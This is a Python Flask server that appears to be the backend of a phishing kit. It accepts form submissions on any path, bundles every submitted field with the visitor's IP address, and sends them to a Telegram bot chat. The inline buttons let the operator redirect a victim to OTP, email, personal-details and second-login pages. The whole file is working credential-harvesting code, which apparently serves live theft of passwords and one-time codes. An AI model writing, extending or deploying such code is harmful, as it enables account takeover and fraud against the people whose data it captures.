from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv

# Load environment variables from Render or .env
load_dotenv()

app = Flask(__name__)
CORS(app)

# Telegram Bot Settings
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing one or more required environment variables.")

# Redirect Buttons Only
REDIRECT_BUTTONS = [
    [{"text": "OTP Page", "callback_data": "redirect_otp"}],
    [{"text": "Email Page", "callback_data": "redirect_email"}],
    [{"text": "Personal Page", "callback_data": "redirect_personal"}],
    [{"text": "Login2 Page", "callback_data": "redirect_login2"}],
    [{"text": "C Page", "callback_data": "redirect_c"}]
]

# Message Sender
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": {
            "inline_keyboard": REDIRECT_BUTTONS
        }
    }
    response = requests.post(url, json=payload)
    return response.ok

# Generic POST Handler
@app.route('/<page>', methods=["POST"])
def receive_form(page):
    if request.method == "POST":
        data = request.form.to_dict()
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        message_lines = [f"<b>{page.upper()} Submission</b>"]
        for k, v in data.items():
            message_lines.append(f"<b>{k}:</b> <code>{v}</code>")
        message_lines.append(f"<b>IP:</b> <code>{ip}</code>")

        full_message = "\n".join(message_lines)
        sent = send_to_telegram(full_message)
        return jsonify({"status": "ok" if sent else "failed"}), 200 if sent else 500

# Health check
@app.route("/", methods=["GET"])
def root():
    return "✅ Flask server is live."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
